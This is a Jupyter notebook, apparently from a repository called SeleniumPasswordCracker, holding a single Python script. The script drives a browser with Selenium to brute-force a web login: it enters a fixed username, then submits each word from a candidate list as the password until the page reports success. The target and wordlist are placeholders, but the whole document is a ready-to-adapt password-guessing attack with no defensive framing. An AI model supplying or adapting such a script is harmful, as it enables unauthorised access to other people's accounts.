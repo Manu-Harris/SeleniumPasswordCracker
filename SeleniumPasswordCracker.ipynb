{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "from selenium import webdriver\n",
    "from selenium.common.exceptions import NoSuchElementException\n",
    "\n",
    "# specify the path to the webdriver\n",
    "driver = webdriver.Chrome(executable_path='path/to/chromedriver')\n",
    "\n",
    "# navigate to the website\n",
    "driver.get('http://www.example.com')\n",
    "\n",
    "# find the username and password fields by their CSS class or id\n",
    "try:\n",
    "    username_field = driver.find_element_by_id('username')\n",
    "    password_field = driver.find_element_by_id('password')\n",
    "except NoSuchElementException:\n",
    "    print(\"Could not find the username or password fields.\")\n",
    "    driver.close()\n",
    "    exit()\n",
    "\n",
    "# enter the username\n",
    "username_field.send_keys(\"myusername\")\n",
    "\n",
    "# list of words to try\n",
    "words = ['word1', 'word2', 'word3']\n",
    "\n",
    "# loop through the words\n",
    "for word in words:\n",
    "    # clear the password field\n",
    "    password_field.clear()\n",
    "    \n",
    "    # enter the word into the password field\n",
    "    password_field.send_keys(word)\n",
    "\n",
    "    # submit the form\n",
    "    try:\n",
    "        driver.find_element_by_id('submit-button').click()\n",
    "    except NoSuchElementException:\n",
    "        print(\"Could not find the submit button.\")\n",
    "        driver.close()\n",
    "        exit()\n",
    "\n",
    "    # check if the word passed (for example, by checking if the login was successful)\n",
    "    if 'success' in driver.page_source:\n",
    "        print(f'{word} passed')\n",
    "        break\n",
    "    else:\n",
    "        print(f'{word} did not pass')\n",
    "\n",
    "# close the browser\n",
    "driver.close()\n"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.5"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
